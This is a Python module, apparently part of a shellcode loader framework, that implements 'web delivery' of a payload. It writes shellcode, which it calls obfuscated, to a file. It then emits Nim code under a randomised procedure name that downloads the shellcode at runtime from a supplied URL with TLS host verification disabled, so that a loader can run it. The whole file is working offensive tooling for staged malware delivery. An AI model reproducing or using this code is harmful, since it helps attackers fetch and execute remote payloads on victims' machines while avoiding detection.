import random
import string
from c.utils.formatters import *

class webdelivery:

    def __init__(self, shellcode: str | bytes | list[str], arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
        if 'outfile' in arguments:
            outfile = arguments['outfile']
        else:
            outfile = 'output.txt'
        self.type = type(shellcode).__name__
        if self.type  == 'bytes':
            open(outfile, 'wb').write(shellcode)
        elif self.type == 'str':
            open(outfile, 'w').write(shellcode)
        elif self.type == 'list':
            open(outfile, 'w').write('\n'.join(shellcode))
            self.listLength = len(shellcode)
        print(f'Writing obfuscated shellcode to {outfile}')
        if 'url' in arguments:
            self.url = arguments['url']
        else:
            print('No url specified')
            exit(0)
        if 'https' in self.url:
            self.client = 'newHttpClient(sslContext=newContext(verifyMode=CVerifyNone))'
        else:
            self.client = f'newHttpClient()'

    def imports(self) -> list[str]:
        return ['import chronos/apps/http/httpclient']

    def compilerOptions(self) -> list[str]:
        return []

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}()')

    def codeblock(self) -> str:
        if self.type == 'bytes':
            return f"""
proc {self.name}(): seq[byte] =
    let flags = {{HttpClientFlag.NoVerifyHost, HttpClientFlag.NoVerifyServerName}}
    let httpSession = HttpSessionRef.new(flags = flags)
    try:
        let resp = waitFor httpSession.fetch(parseUri("{self.url}"))
        result = resp.data
    finally:
        waitFor httpSession.closeWait()
"""
        elif self.type == 'str':
            return f"""
proc {self.name}(): string =
    let flags = {{HttpClientFlag.NoVerifyHost, HttpClientFlag.NoVerifyServerName}}
    let httpSession = HttpSessionRef.new(flags = flags)
    try:
        let resp = waitFor httpSession.fetch(parseUri("{self.url}"))
        result = bytesToString(resp.data)
    finally:
        waitFor httpSession.closeWait()
"""
        elif self.type == 'list':
            return f"""
proc {self.name}(): seq[string] =
    let flags = {{HttpClientFlag.NoVerifyHost, HttpClientFlag.NoVerifyServerName}}
    let httpSession = HttpSessionRef.new(flags = flags)
    try:
        let resp = waitFor httpSession.fetch(parseUri("{self.url}"))
        result = bytesToString(resp.data).split('\\n')
    finally:
        waitFor httpSession.closeWait()
"""
